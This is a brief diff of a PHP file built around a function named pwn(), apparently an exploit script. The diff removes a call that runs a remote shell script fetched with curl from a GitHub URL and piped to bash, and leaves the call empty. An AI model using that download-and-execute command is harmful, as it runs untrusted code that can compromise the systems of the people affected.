@@ -1,6 +1,6 @@
 <?php
 
-pwn('bash -c "$(curl -fsSL https://raw.githubusercontent.com/bangsawantimur/god_mode/main/aka.sh)"');
+pwn('');
 
 function pwn($cmd) {
     define('LOGGING', false);
